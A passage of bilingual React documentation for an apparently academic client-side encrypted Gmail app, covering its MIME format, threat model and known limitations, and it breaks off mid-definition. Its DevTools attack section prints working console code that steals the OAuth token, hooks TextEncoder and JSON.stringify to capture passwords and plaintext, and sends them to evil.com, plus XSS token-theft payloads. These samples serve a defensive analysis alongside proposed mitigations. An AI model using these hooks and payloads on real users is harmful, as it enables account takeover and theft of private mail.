        headers={[t('Operation', 'Thao tác'), t('Endpoint', 'Endpoint'), t('Method', 'Phương thức')]}
        rows={[
          [t('List messages', 'Liệt kê tin nhắn'), '/messages?q=label:inbox&maxResults=50', 'GET'],
          [t('Get message', 'Lấy tin nhắn'), '/messages/{id}?format=full', 'GET'],
          [t('Send message', 'Gửi tin nhắn'), '/messages/send', 'POST'],
          [t('Get profile', 'Lấy hồ sơ'), '/profile', 'GET'],
        ]}
      />

      <H3>{t('Base URL', 'URL gốc')}</H3>
      <Code lang={t('Environment variable', 'Biến môi trường')}>{`VITE_GMAIL_API_BASE=https://gmail.googleapis.com/gmail/v1/users/me`}</Code>

      {/* ─── MIME ─── */}
      <H2 id="mime-format">{t('MIME Construction', 'Cấu trúc MIME')}</H2>
      <p>
        {t(
          'Encrypted emails are sent as standard MIME messages with the',
          'Email mã hóa được gửi dưới dạng tin nhắn MIME chuẩn với'
        )}{' '}
        <code className="rounded bg-slate-100 px-1 text-xs">CryptoPayload</code>{' '}
        {t(
          'JSON as the plain text body. A custom',
          'JSON làm nội dung văn bản thô. Header tùy chỉnh'
        )}{' '}
        <code className="rounded bg-slate-100 px-1 text-xs">X-Encrypted: true</code>{' '}
        {t('header is added for detection.', 'được thêm để phát hiện.')}
      </p>

      <Code lang="MIME format">{`From: sender@gmail.com
To: recipient@gmail.com
Subject: [SecureMail] encrypted message
Content-Type: text/plain; charset=utf-8
X-Encrypted: true

{"version":"1.0","mode":"password","ciphertext":"...","iv":"...","encryptedKey":"...","salt":"..."}`}</Code>

      {/* ─── ENCRYPTED DETECTION ─── */}
      <H2 id="encrypted-detection">{t('Encrypted Mail Detection', 'Phát hiện email mã hóa')}</H2>
      <p>{t(
        'SecureMail uses multiple fallback methods to detect encrypted emails:',
        'SecureMail sử dụng nhiều phương pháp dự phòng để phát hiện email mã hóa:'
      )}</p>
      <Table
        headers={[t('Priority', 'Ưu tiên'), t('Method', 'Phương pháp'), t('Check', 'Kiểm tra')]}
        rows={[
          ['1', 'X-Encrypted header', 'Header value === "true"'],
          ['2', 'Subject contains [SecureMail]', 'String.includes()'],
          ['3', 'Subject contains "version"', 'Handles edge cases'],
          ['4', 'Snippet contains version JSON', 'HTML entity &quot;version&quot;'],
        ]}
      />

      {/* ─── THREAT MODEL ─── */}
      <H2 id="threat-model">{t('Threat Model', 'Mô hình mối đe dọa')}</H2>
      <H3>{t('What SecureMail protects against', 'SecureMail bảo vệ chống lại')}</H3>
      <Table
        headers={[t('Threat', 'Mối đe dọa'), t('Protection', 'Bảo vệ'), t('Mechanism', 'Cơ chế')]}
        rows={[
          [t('Gmail server reads email', 'Máy chủ Gmail đọc email'), t('Content encrypted before transmission', 'Nội dung mã hóa trước khi truyền'), t('AES-256-GCM client-side encryption', 'Mã hóa AES-256-GCM phía client')],
          [t('Man-in-the-middle intercept', 'Tấn công trung gian chặn bắt'), t('Only ciphertext in transit', 'Chỉ bản mã khi truyền tải'), t('End-to-end encryption', 'Mã hóa đầu cuối')],
          [t('Brute-force password attack', 'Tấn công brute-force mật khẩu'), t('Computationally expensive', 'Chi phí tính toán cao'), t('PBKDF2 with 100K iterations', 'PBKDF2 với 100K lần lặp')],
          [t('Rainbow table attack', 'Tấn công rainbow table'), t('Unique salt per message', 'Salt duy nhất cho mỗi tin nhắn'), t('Random 16-byte salt', 'Salt ngẫu nhiên 16 byte')],
          [t('Ciphertext tampering', 'Giả mạo bản mã'), t('Integrity verification', 'Xác minh toàn vẹn'), t('GCM authentication tag (128-bit)', 'Thẻ xác thực GCM (128-bit)')],
          [t('Key reuse across messages', 'Tái sử dụng khóa giữa các tin nhắn'), t('Fresh key per message', 'Khóa mới cho mỗi tin nhắn'), t('Random AES-256 content key per encryption', 'Khóa nội dung AES-256 ngẫu nhiên cho mỗi lần mã hóa')],
        ]}
      />

      {/* ─── SECURITY PROPERTIES ─── */}
      <H2 id="security-properties">{t('Security Properties', 'Thuộc tính bảo mật')}</H2>
      <Table
        headers={[t('Property', 'Thuộc tính'), t('Provided', 'Cung cấp'), t('Mechanism', 'Cơ chế')]}
        rows={[
          [t('Confidentiality', 'Bảo mật'), t('Yes', 'Có'), t('AES-256-GCM encryption', 'Mã hóa AES-256-GCM')],
          [t('Integrity', 'Toàn vẹn'), t('Yes', 'Có'), t('GCM authentication tag', 'Thẻ xác thực GCM')],
          [t('Authentication (data origin)', 'Xác thực (nguồn gốc dữ liệu)'), t('No', 'Không'), t('No digital signatures', 'Không có chữ ký số')],
          [t('Non-repudiation', 'Chống chối bỏ'), t('No', 'Không'), t('Symmetric key — both parties share password', 'Khóa đối xứng — cả hai bên chia sẻ mật khẩu')],
          [t('Forward secrecy', 'Bí mật chuyển tiếp'), t('No', 'Không'), t('Same password decrypts all messages', 'Cùng mật khẩu giải mã mọi tin nhắn')],
          [t('Replay protection', 'Bảo vệ phát lại'), t('No', 'Không'), t('No nonce/timestamp verification', 'Không xác minh nonce/timestamp')],
        ]}
      />

      {/* ─── KNOWN LIMITATIONS ─── */}
      <H2 id="known-limitations">{t('Known Limitations', 'Hạn chế đã biết')}</H2>
      <div className="my-4 space-y-3">
        {[
          {
            severity: 'HIGH',
            title: t('XSS can compromise tokens', 'XSS có thể đánh cắp token'),
            desc: t(
              'localStorage is accessible to any JavaScript running on the page. A Cross-Site Scripting attack could steal the access_token.',
              'localStorage có thể truy cập bởi bất kỳ JavaScript nào chạy trên trang. Tấn công XSS có thể đánh cắp access_token.'
            ),
          },
          {
            severity: 'HIGH',
            title: t('Physical access = key compromise', 'Truy cập vật lý = lộ khóa'),
            desc: t(
              'Anyone with browser access can extract tokens from localStorage and developer tools.',
              'Bất kỳ ai truy cập trình duyệt đều có thể lấy token từ localStorage và công cụ phát triển.'
            ),
          },
          {
            severity: 'MEDIUM',
            title: t('No sender authentication', 'Không xác thực người gửi'),
            desc: t(
              "Without digital signatures, anyone with the recipient's email can send a forged encrypted message.",
              'Không có chữ ký số, bất kỳ ai có email người nhận đều có thể gửi tin nhắn mã hóa giả mạo.'
            ),
          },
          {
            severity: 'MEDIUM',
            title: t('No replay protection', 'Không bảo vệ phát lại'),
            desc: t(
              'Intercepted encrypted emails can be re-sent without detection.',
              'Email mã hóa bị chặn có thể bị gửi lại mà không bị phát hiện.'
            ),
          },
          {
            severity: 'MEDIUM',
            title: t('No forward secrecy', 'Không có bí mật chuyển tiếp'),
            desc: t(
              'Compromising the password exposes all past messages encrypted with that password.',
              'Lộ mật khẩu sẽ lộ tất cả tin nhắn đã mã hóa bằng mật khẩu đó.'
            ),
          },
          {
            severity: 'LOW',
            title: t('Gmail dependency', 'Phụ thuộc Gmail'),
            desc: t(
              'Gmail can deny access, delete emails, or analyze metadata (sender, recipient, timestamps).',
              'Gmail có thể từ chối truy cập, xóa email, hoặc phân tích metadata (người gửi, người nhận, thời gian).'
            ),
          },
        ].map((item) => (
          <div key={item.title} className="flex gap-3 rounded-lg border border-slate-200 bg-white p-4">
            <span className={`mt-0.5 shrink-0 rounded px-2 py-0.5 text-[10px] font-bold ${
              item.severity === 'HIGH' ? 'bg-red-100 text-red-700' :
              item.severity === 'MEDIUM' ? 'bg-amber-100 text-amber-700' :
              'bg-blue-100 text-blue-700'
            }`}>{item.severity}</span>
            <div>
              <p className="text-sm font-semibold text-slate-800">{item.title}</p>
              <p className="mt-0.5 text-xs text-slate-500">{item.desc}</p>
            </div>
          </div>
        ))}
      </div>

      {/* ─── DEVTOOLS ATTACK VECTORS ─── */}
      <H2 id="devtools-attacks">{t('DevTools Attack Vectors', 'Tấn công qua DevTools')}</H2>
      <p className="text-slate-600 leading-relaxed">
        {t(
          'Since SecureMail is a frontend-only application, the browser\'s Developer Tools (F12) provide a powerful attack surface. Below is a comprehensive analysis of attack vectors that an attacker with physical access or XSS capability could exploit.',
          'Vì SecureMail là ứng dụng chỉ chạy phía frontend, công cụ Developer Tools (F12) của trình duyệt tạo ra một bề mặt tấn công mạnh. Dưới đây là phân tích toàn diện các vector tấn công mà kẻ tấn công có quyền truy cập vật lý hoặc khả năng XSS có thể khai thác.'
        )}
      </p>

      <Callout type="danger">
        {t(
          'All client-side anti-DevTools techniques (disabling F12, debugger traps, window size detection) are trivially bypassed and provide zero real security. They are security theater — not defense.',
          'Tất cả kỹ thuật chống DevTools phía client (chặn F12, bẫy debugger, phát hiện kích thước cửa sổ) đều bị vượt qua dễ dàng và không cung cấp bảo mật thực sự. Chúng chỉ là bảo mật hình thức — không phải phòng thủ.'
        )}
      </Callout>

      <H3>{t('Attack 1: Token Theft via localStorage', 'Tấn công 1: Đánh cắp Token qua localStorage')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'The OAuth2 access token is stored in localStorage under the key sm_access_token. Any JavaScript running on the page — or anyone with console access — can read it instantly.',
          'Token truy cập OAuth2 được lưu trong localStorage với key sm_access_token. Bất kỳ JavaScript nào chạy trên trang — hoặc bất kỳ ai có quyền truy cập console — đều có thể đọc ngay lập tức.'
        )}
      </p>
      <Code lang="DevTools Console">{`// Steal the access token
localStorage.getItem('sm_access_token')
// → "ya29.a0AfH6SMB..."

// With this token, the attacker can:
// 1. Read all emails (encrypted + unencrypted)
fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=10', {
  headers: { Authorization: 'Bearer ' + localStorage.getItem('sm_access_token') }
}).then(r => r.json()).then(console.log)

// 2. Send emails as the victim
fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages/send', {
  method: 'POST',
  headers: {
    Authorization: 'Bearer ' + localStorage.getItem('sm_access_token'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ raw: btoa('To: target@gmail.com\\r\\nSubject: Fake\\r\\n\\r\\nForged email') })
})`}</Code>
      <Table
        headers={[t('Impact', 'Tác động'), t('Severity', 'Mức độ'), t('Root Cause', 'Nguyên nhân gốc')]}
        rows={[
          [t('Full Gmail API access', 'Toàn quyền truy cập Gmail API'), 'CRITICAL', t('Token in localStorage — accessible by any JS', 'Token trong localStorage — JS nào cũng đọc được')],
          [t('Send forged emails', 'Gửi email giả mạo'), 'HIGH', t('Bearer token has gmail.send scope', 'Bearer token có scope gmail.send')],
          [t('Read all mailbox', 'Đọc toàn bộ hộp thư'), 'HIGH', t('Bearer token has gmail.readonly scope', 'Bearer token có scope gmail.readonly')],
        ]}
      />

      <H3>{t('Attack 2: Password Interception via Web Crypto API Hooking', 'Tấn công 2: Chặn mật khẩu qua hook Web Crypto API')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'The encryption password passes through TextEncoder.encode() before being fed to PBKDF2. An attacker can monkey-patch this function to capture every password before key derivation occurs.',
          'Mật khẩu mã hóa đi qua TextEncoder.encode() trước khi được đưa vào PBKDF2. Kẻ tấn công có thể monkey-patch hàm này để bắt mọi mật khẩu trước khi dẫn xuất khóa xảy ra.'
        )}
      </p>
      <Code lang="DevTools Console — Password Interception">{`// Hook TextEncoder to capture passwords
const origEncode = TextEncoder.prototype.encode
TextEncoder.prototype.encode = function(input) {
  // Log every string being encoded — includes passwords and plaintext
  console.log('[INTERCEPTED]', input)
  // Send to attacker's server
  navigator.sendBeacon('https://evil.com/log', input)
  return origEncode.call(this, input)
}

// Alternative: Hook crypto.subtle.deriveKey directly
const origDeriveKey = crypto.subtle.deriveKey.bind(crypto.subtle)
crypto.subtle.deriveKey = async function(...args) {
  console.log('[PBKDF2 PARAMS]', args) // salt, iterations visible
  return origDeriveKey(...args)
}`}</Code>
      <Callout type="warning">
        {t(
          'This attack captures the password BEFORE PBKDF2 processing. The 100,000 iterations provide zero protection against this vector because the raw password is intercepted at the input stage.',
          'Tấn công này bắt mật khẩu TRƯỚC KHI PBKDF2 xử lý. 100.000 lần lặp không bảo vệ được gì trước vector này vì mật khẩu thô bị chặn tại giai đoạn đầu vào.'
        )}
      </Callout>

      <H3>{t('Attack 3: Plaintext Capture Before Encryption', 'Tấn công 3: Bắt văn bản gốc trước khi mã hóa')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'SecureMail bundles email body and subject as JSON before encryption. An attacker can hook JSON.stringify to capture the plaintext before AES-256-GCM encryption occurs.',
          'SecureMail gộp nội dung và tiêu đề email thành JSON trước khi mã hóa. Kẻ tấn công có thể hook JSON.stringify để bắt văn bản gốc trước khi AES-256-GCM mã hóa.'
        )}
      </p>
      <Code lang="DevTools Console — Plaintext Capture">{`// Hook JSON.stringify to intercept email content before encryption
const origStringify = JSON.stringify
JSON.stringify = function(obj) {
  // Detect the {body, subject} bundle that cryptoService creates
  if (obj && typeof obj === 'object' && 'body' in obj && 'subject' in obj) {
    console.log('[EMAIL PLAINTEXT CAPTURED]')
    console.log('Subject:', obj.subject)
    console.log('Body:', obj.body)
    // Exfiltrate to attacker
    navigator.sendBeacon('https://evil.com/capture', origStringify(obj))
  }
  return origStringify.apply(this, arguments)
}`}</Code>
      <Table
        headers={[t('What is captured', 'Dữ liệu bị bắt'), t('Source', 'Nguồn'), t('File & Line', 'File & Dòng')]}
        rows={[
          [t('Email body (plaintext)', 'Nội dung email (văn bản gốc)'), 'JSON.stringify({ body, subject })', 'cryptoService.ts:32'],
          [t('Email subject (plaintext)', 'Tiêu đề email (văn bản gốc)'), 'JSON.stringify({ body, subject })', 'cryptoService.ts:32'],
          [t('Encryption password', 'Mật khẩu mã hóa'), 'TextEncoder.encode(password)', 'cryptoService.ts:9'],
        ]}
      />

      <H3>{t('Attack 4: Zustand Store Memory Inspection', 'Tấn công 4: Kiểm tra bộ nhớ Zustand Store')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'After a user decrypts an email, the plaintext content remains in the Zustand store (in-memory state). An attacker can access this through React DevTools or by intercepting fetch responses.',
          'Sau khi người dùng giải mã email, nội dung plaintext vẫn nằm trong Zustand store (trạng thái trong bộ nhớ). Kẻ tấn công có thể truy cập qua React DevTools hoặc chặn phản hồi fetch.'
        )}
      </p>
      <Code lang="DevTools Console — State Inspection">{`// Method 1: Intercept all Gmail API responses
const origFetch = window.fetch
window.fetch = async function(...args) {
  const response = await origFetch.apply(this, args)
  const url = typeof args[0] === 'string' ? args[0] : args[0]?.url || ''
  if (url.includes('googleapis.com')) {
    const clone = response.clone()
    clone.json().then(data => {
      console.log('[GMAIL API]', url.split('?')[0], data)
    }).catch(() => {})
  }
  return response
}

// Method 2: After user decrypts, read from DOM
// The decrypted content is rendered in the page — visible in Elements tab
document.querySelector('[class*="prose"]')?.innerText`}</Code>

      <H3>{t('Attack 5: Network Traffic Analysis', 'Tấn công 5: Phân tích lưu lượng mạng')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'The Network tab in DevTools reveals all communication between SecureMail and Gmail API, including the OAuth2 token in every request header.',
          'Tab Network trong DevTools hiển thị toàn bộ giao tiếp giữa SecureMail và Gmail API, bao gồm token OAuth2 trong header của mọi request.'
        )}
      </p>
      <Table
        headers={[t('Visible in Network Tab', 'Hiển thị trong tab Network'), t('Protected?', 'Được bảo vệ?'), t('Detail', 'Chi tiết')]}
        rows={[
          [t('Access token (Authorization header)', 'Access token (header Authorization)'), t('No', 'Không'), t('Plaintext in every request', 'Văn bản thô trong mọi request')],
          [t('Email metadata (From, To, Date)', 'Metadata email (From, To, Date)'), t('No', 'Không'), t('Gmail returns metadata in cleartext', 'Gmail trả metadata dạng rõ')],
          [t('CryptoPayload JSON', 'CryptoPayload JSON'), t('Yes (encrypted)', 'Có (đã mã hóa)'), t('Body is AES-256-GCM ciphertext', 'Nội dung là bản mã AES-256-GCM')],
          [t('Decrypted content', 'Nội dung đã giải mã'), t('Yes', 'Có'), t('Decryption happens client-side, never sent to network', 'Giải mã xảy ra phía client, không gửi qua mạng')],
        ]}
      />

      <H3>{t('Attack 6: iframe Sandbox Escape Potential', 'Tấn công 6: Nguy cơ thoát sandbox iframe')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'SecureMail renders HTML emails inside a sandboxed iframe with allow-same-origin. While scripts are blocked (no allow-scripts), the allow-same-origin flag means an iframe CAN access the parent page\'s localStorage if scripts were to somehow execute.',
          'SecureMail render email HTML bên trong iframe sandbox với allow-same-origin. Dù script bị chặn (không có allow-scripts), cờ allow-same-origin có nghĩa iframe CÓ THỂ truy cập localStorage của trang cha nếu script bằng cách nào đó được thực thi.'
        )}
      </p>
      <Code lang="HTML Email — Potential XSS Vector">{`<!-- This is blocked because sandbox lacks allow-scripts -->
<img src="x" onerror="fetch('https://evil.com?t='+parent.localStorage.getItem('sm_access_token'))">

<!-- But if allow-scripts were ever added to the sandbox: -->
<script>
  // Could access parent's localStorage due to allow-same-origin
  const token = parent.localStorage.getItem('sm_access_token')
  new Image().src = 'https://evil.com/steal?token=' + token
</script>`}</Code>
      <Callout type="info">
        {t(
          'Current implementation is safe because the iframe sandbox does NOT include allow-scripts. However, this is a fragile defense — a single code change adding allow-scripts would create a critical vulnerability.',
          'Triển khai hiện tại an toàn vì iframe sandbox KHÔNG bao gồm allow-scripts. Tuy nhiên, đây là phòng thủ mong manh — chỉ cần một thay đổi code thêm allow-scripts sẽ tạo ra lỗ hổng nghiêm trọng.'
        )}
      </Callout>

      <H3>{t('Summary: Data States and Protection', 'Tổng kết: Trạng thái dữ liệu và bảo vệ')}</H3>
      <Table
        headers={[t('Data State', 'Trạng thái dữ liệu'), t('Protected by SecureMail?', 'Được SecureMail bảo vệ?'), t('Vulnerable to DevTools?', 'Bị DevTools tấn công?')]}
        rows={[
          [t('At-rest (on Gmail servers)', 'At-rest (trên server Gmail)'), t('Yes — AES-256-GCM ciphertext', 'Có — bản mã AES-256-GCM'), t('No', 'Không')],
          [t('In-transit (browser ↔ Gmail API)', 'In-transit (trình duyệt ↔ Gmail API)'), t('Yes — ciphertext + HTTPS', 'Có — bản mã + HTTPS'), t('Token visible in Network tab', 'Token hiện trong tab Network')],
          [t('In-use (during encrypt/decrypt)', 'In-use (khi mã hóa/giải mã)'), t('No — plaintext in JS runtime', 'Không — plaintext trong JS runtime'), t('Yes — fully exposed', 'Có — lộ hoàn toàn')],
        ]}
      />

      {/* ─── PRODUCTION MITIGATIONS ─── */}
      <H2 id="production-mitigations">{t('Production Mitigations', 'Giải pháp Production')}</H2>
      <p className="text-slate-600 leading-relaxed">
        {t(
          'The following mitigations would be implemented in a production version of SecureMail. Each addresses a specific attack vector identified in the security analysis above.',
          'Các giải pháp sau sẽ được triển khai trong phiên bản production của SecureMail. Mỗi giải pháp xử lý một vector tấn công cụ thể đã xác định trong phân tích bảo mật ở trên.'
        )}
      </p>

      <H3>{t('1. Backend Token Proxy (eliminates Attack 1)', '1. Backend Token Proxy (loại bỏ Tấn công 1)')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'Instead of storing the OAuth2 token in localStorage, a backend server handles the OAuth2 flow and stores the token in an HttpOnly cookie. JavaScript cannot read HttpOnly cookies, eliminating token theft via DevTools.',
          'Thay vì lưu token OAuth2 trong localStorage, máy chủ backend xử lý luồng OAuth2 và lưu token trong HttpOnly cookie. JavaScript không thể đọc HttpOnly cookie, loại bỏ việc đánh cắp token qua DevTools.'
        )}
      </p>
      <Code lang="Architecture Comparison">{`// CURRENT (vulnerable):
Browser → localStorage.setItem('sm_access_token', token)
         → fetch(gmail_api, { headers: { Authorization: 'Bearer ' + token } })
         → Attacker: localStorage.getItem('sm_access_token') ✓ STOLEN

// PRODUCTION (secure):
Browser → Backend (stores token server-side, sets HttpOnly cookie)
         → fetch('/api/gmail/messages')  // cookie sent automatically
         → Backend → Gmail API (token never exposed to browser)
         → Attacker: localStorage.getItem('sm_access_token') → null
         → Attacker: document.cookie → "" (HttpOnly not readable)`}</Code>
      <Table
        headers={[t('Free Backend Options', 'Backend miễn phí'), t('Features', 'Tính năng'), t('Best For', 'Phù hợp cho')]}
        rows={[
          ['Vercel Edge Functions', t('Already using Vercel, add /api routes', 'Đã dùng Vercel, thêm /api routes'), t('Simplest migration path', 'Đường di chuyển đơn giản nhất')],
          ['Cloudflare Workers', t('100K req/day free, global edge', '100K req/ngày miễn phí, edge toàn cầu'), t('API proxy with rate limiting', 'API proxy với giới hạn tốc độ')],
          ['Supabase', t('Auth + DB + Edge Functions', 'Auth + DB + Edge Functions'), t('Full backend with auth built-in', 'Backend đầy đủ có sẵn auth')],
          ['Firebase', t('Auth + Firestore + Cloud Functions', 'Auth + Firestore + Cloud Functions'), t('Google ecosystem integration', 'Tích hợp hệ sinh thái Google')],
        ]}
      />

      <H3>{t('2. Content Security Policy Headers (mitigates Attack 2, 3, 6)', '2. Content Security Policy Headers (giảm thiểu Tấn công 2, 3, 6)')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'CSP headers restrict which scripts can execute on the page. A strict CSP policy prevents inline scripts, eval(), and unauthorized external scripts — blocking most XSS-based attacks.',
          'CSP headers giới hạn script nào được phép thực thi trên trang. Chính sách CSP nghiêm ngặt ngăn chặn inline script, eval(), và script bên ngoài không được phép — chặn hầu hết tấn công dựa trên XSS.'
        )}
      </p>
      <Code lang="HTTP Headers — Content Security Policy">{`Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://apis.google.com;
  connect-src 'self' https://gmail.googleapis.com https://oauth2.googleapis.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https: data:;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';

// What this blocks:
// ✗ Inline <script> tags (XSS payloads)
// ✗ eval() and new Function() (code injection)
// ✗ Scripts from unauthorized domains
// ✗ navigator.sendBeacon to attacker servers (connect-src)
// ✗ Embedding in iframes (frame-ancestors)`}</Code>
      <Callout type="warning">
        {t(
          'CSP does NOT protect against attacks executed directly in DevTools Console. It only blocks programmatic injection (XSS). Physical access to the browser remains undefendable at the frontend level.',
          'CSP KHÔNG bảo vệ chống tấn công thực hiện trực tiếp trong DevTools Console. Nó chỉ chặn injection lập trình (XSS). Truy cập vật lý vào trình duyệt không thể phòng thủ ở cấp frontend.'
        )}
      </Callout>

      <H3>{t('3. Rate Limiting (mitigates brute-force)', '3. Giới hạn tốc độ (giảm thiểu brute-force)')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'Without a backend, there is no way to limit how many decryption attempts an attacker can make. A backend can enforce rate limits per IP, per user, and per message.',
          'Không có backend, không có cách giới hạn số lần thử giải mã mà kẻ tấn công có thể thực hiện. Backend có thể áp dụng giới hạn tốc độ theo IP, theo người dùng, và theo tin nhắn.'
        )}
      </p>
      <Code lang="Backend Rate Limiting — Pseudocode">{`// Current: No limit — attacker can try millions of passwords
while (true) {
  cryptoService.decrypt(payload, guessPassword()) // unlimited attempts
}

// Production: Backend enforces limits
app.post('/api/decrypt-attempt', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 10,                     // max 10 attempts per window
  message: 'Too many attempts. Try again in 15 minutes.'
}), async (req, res) => {
  // Even PBKDF2's 100K iterations × 10 attempts = manageable
  // vs unlimited attempts = eventually crackable
})`}</Code>

      <H3>{t('4. Digital Signatures (eliminates sender spoofing)', '4. Chữ ký số (loại bỏ giả mạo người gửi)')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'Currently, anyone who knows a recipient\'s email can send them an encrypted message pretending to be someone else. Digital signatures using ECDSA or Ed25519 would cryptographically prove sender identity.',
          'Hiện tại, bất kỳ ai biết email người nhận đều có thể gửi tin nhắn mã hóa giả mạo người khác. Chữ ký số sử dụng ECDSA hoặc Ed25519 sẽ chứng minh danh tính người gửi bằng mật mã.'
        )}
      </p>
      <Code lang="Digital Signature — Proposed Flow">{`// Sender side:
const signature = await crypto.subtle.sign(
  { name: 'ECDSA', hash: 'SHA-256' },
  senderPrivateKey,
  ciphertextBytes
)
// Attach signature to CryptoPayload:
// { ...payload, signature: base64url(signature), signerPublicKey: base64url(pubKey) }

// Recipient side:
const isValid = await crypto.subtle.verify(
  { name: 'ECDSA', hash: 'SHA-256' },
  senderPublicKey,  // fetched from key server or prior exchange
  signatureBytes,
  ciphertextBytes
)
// if (!isValid) → "WARNING: Sender identity could not be verified"`}</Code>

      <H3>{t('5. Subresource Integrity (SRI)', '5. Subresource Integrity (SRI)')}</H3>
      <p className="text-slate-600 leading-relaxed mb-2">
        {t(
          'SRI ensures that JavaScript files loaded by the browser have not been tampered with. If an attacker compromises the CDN or hosting, modified scripts will be rejected by the browser.',
          'SRI đảm bảo các file JavaScript được trình duyệt tải không bị giả mạo. Nếu kẻ tấn công xâm nhập CDN hoặc hosting, các script bị sửa đổi sẽ bị trình duyệt từ chối.'
        )}
      </p>
      <Code lang="HTML — SRI Example">{`<!-- Without SRI: tampered script executes silently -->
<script src="/assets/index.js"></script>

<!-- With SRI: browser verifies hash before execution -->
<script src="/assets/index.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous">
</script>
<!-- If file is modified → browser refuses to execute → attack blocked -->`}</Code>

      <H3>{t('Defense-in-Depth Summary', 'Tổng kết phòng thủ nhiều lớp')}</H3>
      <Table
        headers={[t('Attack Vector', 'Vector tấn công'), t('Current Status', 'Trạng thái hiện tại'), t('Production Fix', 'Giải pháp Production')]}
        rows={[
          [t('Token theft (localStorage)', 'Đánh cắp token (localStorage)'), t('Vulnerable', 'Dễ bị tấn công'), t('HttpOnly cookie via backend proxy', 'HttpOnly cookie qua backend proxy')],
          [t('Password interception', 'Chặn mật khẩu'), t('Vulnerable', 'Dễ bị tấn công'), t('CSP + backend key exchange', 'CSP + trao đổi khóa qua backend')],
          [t('Plaintext capture', 'Bắt văn bản gốc'), t('Vulnerable', 'Dễ bị tấn công'), t('CSP blocks XSS; physical access undefendable', 'CSP chặn XSS; truy cập vật lý không thể phòng thủ')],
          [t('Brute-force decryption', 'Brute-force giải mã'), t('PBKDF2 100K only', 'Chỉ PBKDF2 100K'), t('Backend rate limiting + account lockout', 'Giới hạn tốc độ backend + khóa tài khoản')],
          [t('Sender spoofing', 'Giả mạo người gửi'), t('No protection', 'Không bảo vệ'), t('ECDSA/Ed25519 digital signatures', 'Chữ ký số ECDSA/Ed25519')],
          [t('XSS via HTML email', 'XSS qua email HTML'), t('Sandbox (fragile)', 'Sandbox (mong manh)'), t('CSP + remove allow-same-origin', 'CSP + xóa allow-same-origin')],
          [t('Script tampering', 'Giả mạo script'), t('No protection', 'Không bảo vệ'), t('Subresource Integrity (SRI)', 'Subresource Integrity (SRI)')],
          [t('Replay attacks', 'Tấn công phát lại'), t('No protection', 'Không bảo vệ'), t('Nonce + timestamp in CryptoPayload', 'Nonce + timestamp trong CryptoPayload')],
        ]}
      />

      <Callout type="info">
        {t(
          'SecureMail is a proof-of-concept academic project demonstrating client-side encryption principles. The attack analysis above demonstrates understanding of real-world security limitations inherent to frontend-only architectures. A production system would implement defense-in-depth with the mitigations listed above.',
          'SecureMail là đồ án học thuật proof-of-concept minh họa nguyên lý mã hóa phía client. Phân tích tấn công ở trên thể hiện sự hiểu biết về các hạn chế bảo mật thực tế vốn có của kiến trúc chỉ frontend. Hệ thống production sẽ triển khai phòng thủ nhiều lớp với các giải pháp đã liệt kê.'
        )}
      </Callout>

      {/* ─── TECH STACK ─── */}
      <H2 id="tech-stack">{t('Tech Stack', 'Công nghệ sử dụng')}</H2>
      <Table
        headers={[t('Technology', 'Công nghệ'), t('Version', 'Phiên bản'), t('Purpose', 'Mục đích')]}
        rows={[
          ['React', '19', t('UI framework', 'Framework giao diện')],
          ['TypeScript', '5.x', t('Type safety', 'An toàn kiểu dữ liệu')],
          ['Vite', '8', t('Build tool and dev server', 'Công cụ build và máy chủ phát triển')],
          ['TailwindCSS', '3', t('Utility-first CSS framework', 'Framework CSS utility-first')],
          ['Zustand', 'Latest', t('Lightweight state management', 'Quản lý trạng thái nhẹ')],
          ['React Router', 'v7', t('Client-side routing', 'Định tuyến phía client')],
          ['Web Crypto API', 'Browser native', t('All cryptographic operations', 'Mọi thao tác mã hóa')],
          ['Vitest', 'Latest', t('Unit testing framework', 'Framework kiểm thử đơn vị')],
          ['Vercel', '—', t('Deployment platform', 'Nền tảng triển khai')],
        ]}
      />

      {/* ─── PROJECT STRUCTURE ─── */}
      <H2 id="project-structure">{t('Project Structure', 'Cấu trúc dự án')}</H2>
      <Code lang="Directory tree">{`securemail/src/
├── types/index.ts           # Core interfaces: User, MailMeta, MailDetail, CryptoPayload
├── services/
│   ├── cryptoService.ts     # ALL encryption/decryption logic (most critical file)
│   ├── authService.ts       # Google OAuth2 PKCE flow
│   └── gmailService.ts      # Gmail REST API (list/get/send)
├── store/mailStore.ts       # Zustand store — global state
├── utils/
│   ├── base64.ts            # base64url encode/decode
│   ├── mimeBuilder.ts       # MIME email construction
│   ├── keyStore.ts          # Public key persistence
│   ├── formatDate.ts        # Date formatting
│   └── highlightJson.ts     # JSON syntax highlighting
├── components/
│   ├── layout/              # AppShell, Sidebar, MailList, TopBar
│   ├── compose/             # ComposeModal, PasswordLock
│   ├── decrypt/             # CipherPanel, DecryptForm, SecurityDetails
│   └── common/              # Avatar, Badge, Spinner, Toast
├── pages/
│   ├── Landing.tsx          # Project showcase page
│   ├── Docs.tsx             # Technical documentation
│   ├── Login.tsx            # Google sign-in
│   ├── AuthCallback.tsx     # OAuth redirect handler
│   └── Inbox.tsx            # Main app (contains AppShell)
└── main.tsx                 # Routes`}</Code>

      {/* ─── DATA TYPES ─── */}
      <H2 id="data-types">{t('Data Types', 'Kiểu dữ liệu')}</H2>

      <H3>User</H3>
      <Code lang="TypeScript">{`interface User {
  id: string
  email: string
  name: string
  picture: string
}`}</Code>

      <H3>MailMeta</H3>
      <Code lang="TypeScript">{`interface MailMeta {
